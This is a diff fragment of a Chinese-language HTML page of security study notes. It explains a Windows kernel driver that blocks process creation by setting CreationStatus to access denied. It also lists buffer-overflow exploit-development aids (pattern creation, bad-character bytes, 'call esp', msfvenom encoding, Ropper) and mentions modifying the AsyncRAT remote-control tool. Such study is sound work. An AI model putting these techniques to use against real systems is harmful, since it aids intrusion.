+        DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
+    //设置处理设备控制的IRP请求函数为OnDeviceControl
+        DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;
+
+        KdPrint((DRIVER_PREFIX &quot;Driver is loaded successfully.\n&quot;));
+    } while (false);
+
+    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pDeviceObject != nullptr))
+        ::IoDeleteDevice(pDeviceObject);
+
+    return ntstatus;
+}
+</code></pre>
+<p>驱动卸载程序函数<code>DriverUnload</code></p>
+<pre><code class="language-C">void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
+{
+    UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
+    ::IoDeleteSymbolicLink(&amp;symlinkPath);   //删除符号链接
+    ::IoDeleteDevice(DriverObject-&gt;DeviceObject);  //删除设备对象
+
+    //如果存在Callback函数，则注销
+    if (g_CallbackRegistered)
+    {
+        ::PsSetCreateProcessNotifyRoutineEx2(
+            PsCreateProcessNotifySubsystems,
+            (PVOID)ProcessBlockRoutine,
+            TRUE);
+    }
+
+    KdPrint((DRIVER_PREFIX &quot;Driver is unloaded.\n&quot;));
+}
+</code></pre>
+<p>创建和关闭设备函数<code>OnCreateClose</code>。
+作用是设置状态</p>
+<pre><code class="language-C">NTSTATUS OnCreateClose(
+    _Inout_ PDEVICE_OBJECT DeviceObject,
+    _Inout_ PIRP Irp)
+{
+    UNREFERENCED_PARAMETER(DeviceObject);
+
+    NTSTATUS ntstatus = STATUS_SUCCESS;
+    Irp-&gt;IoStatus.Status = ntstatus;
+    Irp-&gt;IoStatus.Information = 0u;
+    IoCompleteRequest(Irp, 0);
+
+    return ntstatus;
+}
+</code></pre>
+<p>控制函数</p>
+<pre><code class="language-C">NTSTATUS OnDeviceControl(
+    _Inout_ PDEVICE_OBJECT DeviceObject,
+    _Inout_ PIRP Irp)
+{
+    UNREFERENCED_PARAMETER(DeviceObject);
+
+    NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
+    PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
+    auto&amp; dic = irpSp-&gt;Parameters.DeviceIoControl;
+    ULONG_PTR info = NULL;
+
+    switch (dic.IoControlCode)
+    {
+    //IOCTL_SET_PROCESS_FILENAME是进制创建相应进程的代码
+    case IOCTL_SET_PROCESS_FILENAME:
+        if (dic.InputBufferLength &lt; sizeof(BLOCK_FILENAME_INFO))
+        {
+            ntstatus = STATUS_BUFFER_TOO_SMALL;
+            break;
+        }
+
+    //获取互斥锁
+        ::ExAcquireFastMutex(&amp;g_FastMutex);
+    //这里获取传入的文件名保存到g_ImageFileNameSuffix[]
+        ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258);
+        g_ImageFileNameSuffix[0] = L'\\';
+        ::memcpy(&amp;g_ImageFileNameSuffix[1], Irp-&gt;AssociatedIrp.SystemBuffer, sizeof(BLOCK_FILENAME_INFO));
+        g_ImageFileNameSuffix[257] = L'\0';
+
+        KdPrint((DRIVER_PREFIX &quot;Target ImageFileName pattern is updated to \&quot;%ws\&quot;.\n&quot;, &amp;g_ImageFileNameSuffix));
+
+    //注册callback函数PsSetCreateProcessNotifyRoutineEx2，执行ProcessBlockRoutine锁进程创建的函数
+        if (!g_CallbackRegistered)
+        {
+            ntstatus = ::PsSetCreateProcessNotifyRoutineEx2(
+                PsCreateProcessNotifySubsystems,
+                (PVOID)ProcessBlockRoutine,
+                FALSE);
+
+            if (!NT_SUCCESS(ntstatus))
+            {
+                KdPrint((DRIVER_PREFIX &quot;Failed to register Process Notify Routine (NTSTATUS = 0x%08X).&quot;, ntstatus));
+                break;
+            }
+            else
+            {
+                g_CallbackRegistered = TRUE;
+                KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is registered successfully.\n&quot;));
+            }
+        }
+
+    //释放互斥锁
+        ::ExReleaseFastMutex(&amp;g_FastMutex);
+
+        info = ::wcslen(g_ImageFileNameSuffix) * sizeof(WCHAR);
+        ntstatus = STATUS_SUCCESS;
+
+        break;
+
+    //IOCTL_UNREGISTER_CALLBACK分支是释放回调函数
+    case IOCTL_UNREGISTER_CALLBACK:
+        ::ExAcquireFastMutex(&amp;g_FastMutex);
+
+        if (g_CallbackRegistered)
+        {
+            ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258);
+            ntstatus = ::PsSetCreateProcessNotifyRoutineEx2(
+                PsCreateProcessNotifySubsystems,
+                (PVOID)ProcessBlockRoutine,
+                TRUE);
+
+            if (!NT_SUCCESS(ntstatus))
+            {
+                KdPrint((DRIVER_PREFIX &quot;Failed to unregister Process Notify Callback (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            }
+            else
+            {
+                g_CallbackRegistered = FALSE;
+                KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is unregistered successfully.\n&quot;));
+            }
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;Process Notify Callback is not registered.\n&quot;));
+        }
+
+        ::ExReleaseFastMutex(&amp;g_FastMutex);
+    }
+
+    //完成IRP请求
+    Irp-&gt;IoStatus.Status = ntstatus;
+    Irp-&gt;IoStatus.Information = info;
+    IoCompleteRequest(Irp, 0);
+
+    return ntstatus;
+}
+</code></pre>
+<p>这样看来是通过设置了一个控制的回调函数来实现禁止进程创建的。</p>
+<p><code>ProcessBlockRoutine</code>函数</p>
+<p>实现功能逻辑就是
+<code>CreateInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED</code>
+将<code>CreateInfo</code>的<code>CreationStatus</code>设置为<code>STATUS_ACCESS_DENIED</code></p>
+<pre><code class="language-C">void ProcessBlockRoutine(
+    _Inout_ PEPROCESS Process,
+    _In_ HANDLE ProcessId,
+    _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo)
+{
+    UNREFERENCED_PARAMETER(Process);
+    UNREFERENCED_PARAMETER(ProcessId);
+
+    if (CreateInfo != nullptr)
+    {
+        ::ExAcquireFastMutex(&amp;g_FastMutex);
+
+        if (::wcslen(g_ImageFileNameSuffix) &gt; 0)
+        {
+            UNICODE_STRING suffix{ 0 };
+            ::RtlInitUnicodeString(&amp;suffix, g_ImageFileNameSuffix);
+
+            if (::RtlSuffixUnicodeString(&amp;suffix, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName, TRUE))
+            {
+                CreateInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED;
+                KdPrint((DRIVER_PREFIX &quot;Blocked Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
+            }
+            else
+            {
+                KdPrint((DRIVER_PREFIX &quot;Allowed Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
+            }
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;Allowed Process: %wZ\n&quot;, (PUNICODE_STRING)CreateInfo-&gt;ImageFileName));
+        }
+
+        ::ExReleaseFastMutex(&amp;g_FastMutex);
+    }
+}
+</code></pre>
+<p><code>CreateInfo</code>结构体</p>
+<pre><code class="language-c">typedef struct _PPS_CREATE_NOTIFY_INFO
+{
+    UNICODE_STRING ImageFileName;  //成员包含新进程的映像文件名。该成员是一个 `UNICODE_STRING` 结构，包含文件名的字符串和长度
+
+    UNICODE_STRING ProcessName;   //成员包含新进程的主模块名。该成员也是一个 `UNICODE_STRING` 结构
+    HANDLE ProcessId;       //成员包含新进程的句柄。该成员是一个 `HANDLE` 类型
+    NTSTATUS CreationStatus;    //成员包含新进程的创建状态。该成员是一个 `NTSTATUS` 类型。
+} PPS_CREATE_NOTIFY_INFO;    
+
+</code></pre>
+<p><code>CreationStatus</code>是一个<code>NTSTATUS</code>值，将值定义成错误类型的值就可以阻止进程创建。
+微软定义的所有<code>NTSTATUS</code>值可在<code>ntstatus.h</code>找到。
+由于定义的是<code>STATUS_ACCESS_DENIED</code>，所以系统出现的拒绝访问弹窗，改成其他状态又会是另一种弹窗或是无弹窗。
+但这些都不重要，重要的是错误状态阻止了进程的创建。</p>
+<p><img alt="" src="../../images/Snipaste_2023-12-14_15-35-45.jpg" /></p>
+<p>用windbg调试一下驱动，在<code>BlockNewProcDrv_x64</code>驱动中可找到<code>_PPS_CREATE_NOTIFY_INFO</code>结构体
+<img alt="" src="../../images/Snipaste_2023-12-14_16-13-31.jpg" /></p>
+<p>在<code>ProcessBlockRoutine</code>函数调用前下断点，可以看到当前传入的变量
+<img alt="" src="../../images/Snipaste_2023-12-14_16-44-27.jpg" /></p>
 <h2 id="windbg">Windbg</h2>
 <p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands</p>
 <p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques</p>
-<h3 id="_39">常用命令</h3>
+<h3 id="_45">常用命令</h3>
+<ul>
+<li>.process 查看进程信息</li>
+</ul>
+<pre><code>.process 0 0 cmd.exe    查找进程
+</code></pre>
 <ul>
 <li>lm 查看模块</li>
 </ul>
@@ -1550,12 +2325,12 @@ bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000
 bcdedit /dbgsettings serial debugport:2 baudrate:115200
 
 </code></pre>
-<h1 id="_40">书籍工具</h1>
+<h1 id="_46">书籍工具</h1>
 <h2 id="reverse-engineering-for-beginners">Reverse Engineering for Beginners</h2>
 <h2 id="windows_1">Windows 令牌相关学习</h2>
 <p>https://github.com/daem0nc0re/PrivFu/</p>
-<h2 id="_41">工具</h2>
-<h4 id="_42">在线源码汇编互转工具</h4>
+<h2 id="_47">工具</h2>
+<h4 id="_48">在线源码汇编互转工具</h4>
 <p>https://godbolt.org/</p>
 <h4 id="pe-tools">PE Tools</h4>
 <p>看pe的</p>
@@ -1582,13 +2357,12 @@ https://github.com/mandiant/speakeasy</p>
 <h4 id="asyncrat-c-sharp">AsyncRAT-C-Sharp</h4>
 <p>一款开源远控，可以二开一下改着自己玩---待办
 https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</p>
-<h2 id="_43">参考资料</h2>
+<h2 id="_49">参考资料</h2>
 <h3 id="interpdf">Inter架构手册.pdf</h3>
 <p>https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html</p>
-<h1 id="_44">命令</h1>
-<ul>
-<li>msf-pattern_create  //生成指定长度的数据</li>
-</ul>
+<h1 id="_50">命令</h1>
+<h2 id="pattern">pattern</h2>
+<p>msf-pattern_create  //生成指定长度的数据</p>
 <pre><code>Usage: msf-pattern_create [options]
 Example: msf-pattern_create -l 50 -s ABC,def,123
 Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
@@ -1613,6 +2387,7 @@ Options:
 </ul>
 <pre><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
 </code></pre>
+<h2 id="nasm">nasm</h2>
 <ul>
 <li>汇编指令转16进制
 使用MSF的自带工具
@@ -1628,7 +2403,10 @@ nasm &gt; call esp
 </ul>
 <pre><code>generate -b &quot;\x00\x0a\x0d&quot;
 </code></pre>
-<h1 id="_45">工具</h1>
+<h2 id="ropper">Ropper</h2>
+<p>ROP链寻找工具</p>
+<p>https://github.com/sashs/Ropper</p>
+<h1 id="_51">工具</h1>
 <pre><code>Ghidra、IDA
 </code></pre>
 <h2 id="boofuzz">boofuzz使用</h2>
@@ -1682,17 +2460,12 @@ https://github.com/x64dbg/x64dbgpylib
 clean_mona.py复制到x64dbgpy/x64dbgpy/autorun中
 
 </code></pre>
-<h1 id="_46">书籍</h1>
+<h1 id="_52">书籍</h1>
 <p>https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/</p>
-<h1 id="_47">再看</h1>
+<h1 id="_53">再看</h1>
 <p>https://www.x86matthew.com/view_post?id=create_svc_rpc</p>
 <p>异形PE文件
 https://secret.club/2023/06/05/spoof-pe-sections.html</p>
-<p>elf文件
-https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/
-https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/
-https://intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/
-https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</p>
 
   <br>
     
@@ -1705,12 +2478,12 @@ https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-
   <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
     
     <div class="wm-article-nav pull-right">
-      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-default pull-right">
+      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
         Next
         <i class="fa fa-chevron-right" aria-hidden="true"></i>
       </a>
-      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-link">
-        Windows API示例大全
+      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        Linux安全笔记
       </a>
     </div>
     
